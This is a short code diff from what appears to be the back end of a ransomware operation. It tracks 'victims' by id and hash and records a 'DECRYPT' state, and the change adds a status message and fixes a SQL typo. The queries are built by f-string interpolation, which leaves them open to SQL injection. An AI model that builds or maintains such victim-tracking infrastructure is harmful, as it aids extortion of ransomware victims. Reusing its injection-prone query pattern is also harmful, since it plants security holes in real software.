@@ -201,7 +201,7 @@ def history_req(conn, id_victim):
 
 def change_state(conn, id_victim):
     insert_data(conn, 'states', '(id_victim, datetime, state)', f"({id_victim}, {int(time.time())}, 'DECRYPT')")
-
+    return f'State for id:{id_victim} has been changed.'
 
 '''
 # insert fake victims data
@@ -239,7 +239,7 @@ def check_hash(conn, hash_v):
         query = f'''
         SELECT states.state, MAX(states.datetime)
         FROM states
-        WHERE states id_victim = {victim[0]}
+        WHERE states.id_victim = {victim[0]}
         '''
         last_state = (select_data(conn, query))[0][0]
         victim.append(last_state)
